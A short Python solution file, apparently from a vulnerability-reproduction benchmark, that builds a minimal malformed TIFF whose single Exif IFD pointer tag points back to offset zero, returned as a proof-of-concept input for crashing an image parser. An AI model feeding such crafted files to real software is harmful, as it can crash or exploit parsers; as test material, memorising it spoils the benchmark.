import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        header = b'\x49\x49\x2A\x00\x08\x00\x00\x00'
        num_tags = struct.pack('<H', 1)
        tag = struct.pack('<HHII', 0x8769, 4, 1, 0)
        next_ifd = struct.pack('<I', 0)
        poc = header + num_tags + tag + next_ifd
        return poc
